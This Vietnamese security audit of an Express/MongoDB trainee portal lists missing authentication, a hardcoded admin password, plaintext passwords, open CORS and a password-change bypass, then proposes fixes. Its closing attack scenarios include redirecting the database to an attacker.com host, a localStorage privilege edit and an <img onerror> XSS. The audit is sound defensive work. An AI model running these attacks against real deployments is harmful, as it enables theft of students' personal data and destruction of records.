Báo cáo phân tích mã nguồn — Trainee Portal 2026
0. Tổng quan kiến trúc
Backend: Express 4.21 + Mongoose 8 + dotenv, chạy đơn process server.js (730 dòng), toàn bộ business logic dồn vào config/db.js (1878 dòng).
Frontend: SPA thuần JS (public/js/app.js ~5893 dòng, scheduleData.js, duolingo.js, chart.js, api.js).
DB: MongoDB Atlas (chuỗi kết nối thật trong .env).
Mô hình xác thực hiện tại: chỉ có tài khoản admin/1234 hardcode; sinh viên/khách không cần đăng nhập mà xem trực tiếp.
I. BẢO MẬT (ưu tiên hàng đầu)
Trả lời trực tiếp câu hỏi của bạn:
CÓ. Tài khoản admin chắc chắn bị tấn công ngay khi lên production. Thực chất attacker không cần "đánh cắp" tài khoản admin, vì toàn bộ API admin đều mở trắng không cần xác thực. Mật khẩu admin còn được ghi rõ trong source code (admin/1234). Dưới đây là các lỗ hổng cụ thể.

🔴 S1. Không có bất kỳ cơ chế xác thực/phân quyền nào trên API (NGHIÊM TRỌNG NHẤT)
Toàn bộ các route ghi chú (Chỉ Admin) chỉ là comment, không có một middleware nào kiểm tra quyền. Tôi đã grep xác nhận: không có Authorization, req.session, req.user, JWT, session, cookie ở bất kỳ đâu.

Kết quả: bất kỳ ai (kể cả bot) gọi thẳng được:

Việc "chặn" admin ở frontend (switchTab('admin') chỉ kiểm tra state.currentUser.role trong localStorage) là ảo — chỉ cần gõ localStorage.setItem('uit_trainee_auth_user', JSON.stringify({role:'admin'})) là mở được UI admin, và API thì chẳng cần làm vậy vì nó vốn đã mở.

Hậu quả thực tế: attacker có thể xóa toàn bộ dữ liệu sinh viên, sửa điểm, đổi mật khẩu mọi tài khoản, gán link MS Teams giả để phishing sinh viên.

🔴 S6. Mật khẩu lưu plaintext, không hash

🔴 S7. CORS mở toàn bộ → rò rỉ dữ liệu cá nhân cross-origin
server.js:44: app.use(cors()) — mặc định Access-Control-Allow-Origin: *. Vì API không cần auth nên bất kỳ website nào mở trong trình duyệt người dùng đều có thể fetch('http://<host>/api/trainees') và đọc toàn bộ dữ liệu sinh viên (email, sđt, điểm, MSSV). Đây là rò rỉ PII nghiêm trọng.

🟠 S8. Lỗi logic "đổi mật khẩu" cho phép reset mà không cần mật khẩu cũ
server.js:154:

js


if (currentPassword && trainee.password &&
    trainee.password !== currentPassword.trim() &&
    trainee.password !== '1234') { return lỗi }
Vì mọi sinh viên đều có mật khẩu mặc định '1234', điều kiện trainee.password !== '1234' = false → toàn bộ biểu thức = false → bỏ qua kiểm tra mật khẩu cũ. 🟠 S10. Mass assignment trên Trainee
createTrainee (db.js:329-349) và updateTrainee (db.js:417-421) dùng ...data / $set: updateData trực tiếp → attacker ghi được mọi trường: role (kể cả 'admin'), password, traineeId, email, bio, skills... Không có whitelist trường.

🟡 S11–S13 (mức trung bình nhưng nên xử lý)
Lộ thông tin lỗi: các handler 500 trả error: err.message (server.js:82, 105, 129...) → leak nội bộ (path, tên model, lỗi MongoDB...).
Không có helmet / security headers (CSP, X-Frame-Options, X-Content-Type-Options...) → dễ clickjacking và khó chặn XSS.
Không rate limit trên /api/auth/login → brute-force thoải mái (dù mật khẩu là hằng số nên không cần brute).
express.json({limit:'10mb'}) không giới hạn tổng → upload avatar base64 lớn làm đầy DB.

IV. ĐỀ XUẤT CẢI TIẾN (theo thứ tự ưu tiên)
Bước 1 — Chặn máu ngay (production blocker)
Xóa/xoay ngay credential thật trong .env, đổi password MongoDB, thêm .gitignore (node_modules/, .env).
Thêm middleware requireAdmin cho mọi route (Chỉ Admin):
js


function requireAdmin(req, res, next) {
  const token = req.headers.authorization;
  if (!token || !verifyJwt(token)) return res.status(401).json({ success:false, message:'Unauthorized' });
  if (req.user?.role !== 'admin') return res.status(403).json({ success:false, message:'Forbidden' });
  next();
}
app.post('/api/trainees', requireAdmin, ...);
Kèm JWT (đăng nhập xong cấp token có role, exp). Đây là thay đổi quan trọng nhất.
Bỏ endpoint /api/config/mongodb hoặc gắn requireAdmin + chỉ cho phép cấu hình từ localhost.
Hash mật khẩu bằng bcrypt (xóa default 1234), và sửa lỗi logic đổi mật khẩu ở server.js:154.
Chặn admin hardcode → lưu admin trong DB với mật khẩu bcrypt, buộc đổi mật khẩu lần đầu.
Bước 2 — Chống XSS / input
Thống nhất output-encoding: bắt buộc dùng escapeHtml() hoặc textContent cho mọi dữ liệu render (đặc biệt Schedule, Announcement, Trainee.bio/skills, Assignment.link). Hoặc dùng template engine auto-escape (EJS/Handlebars) / framework (React).
Validate input server-side: whitelist trường cho createTrainee/updateTrainee (bỏ mass assignment), validate traineeId (chỉ số, độ dài), validate assignment.link chỉ cho https://.
Escape regex cho search/deleteTrainee (hoặc dùng $text index thay vì $regex).
Bước 3 — Hardening
CORS: chỉ cho origin cụ thể (cấu hình env), không *.
helmet + CSP, rate-limit login (vd express-rate-limit), giới hạn body 1–2mb, chặn upload SVG.
Không trả err.message ra client; log server-side, trả thông báo chung chung.
Bước 4 — Sửa logic/UI
Sửa getTraineeById trả null đúng nghĩa (L1), sửa ghi đè $or search+track (L2), sửa updateSchedule/deleteSchedule xử lý id không hợp lệ (L9), bỏ hardcode "today" (L10).
Tối ưu syncRanksByStars bằng bulkWrite (L6); cân nhắc đưa xếp hạng sang aggregation thay vì lưu cố định.
Nối lại các element null / dọn UI chết (dashboard/profile switch, nút cấu hình MongoDB).
V. Kịch bản tấn công thực tế vào admin khi lên production (minh họa)
Kịch bản A — chiếm DB không cần đăng nhập: attacker POST /api/config/mongodb {"uri":"mongodb://attacker.com:27017"} → server ghi .env, chuyển hướng kết nối → toàn bộ dữ liệu sinh viên chảy về DB của attacker.
Kịch bản B — phá hoại dữ liệu: attacker DELETE /api/trainees/25520918 (hoặc lặp qua tất cả) → xóa sạch sinh viên; hoặc POST /api/schedules/reset → xóa lịch.
Kịch bản C — XSS chiếm session/quyền admin: attacker gửi schedule có <img onerror> → script chạy trong trình duyệt của admin thật khi admin mở trang lịch → đọc localStorage.uit_trainee_auth_user / thay đổi giao diện admin.
Kịch bản D — account takeover sinh viên: vì change-password bỏ qua mật khẩu cũ (S8) và resolve không auth (L8), attacker đổi mật khẩu bất kỳ sinh viên nào.
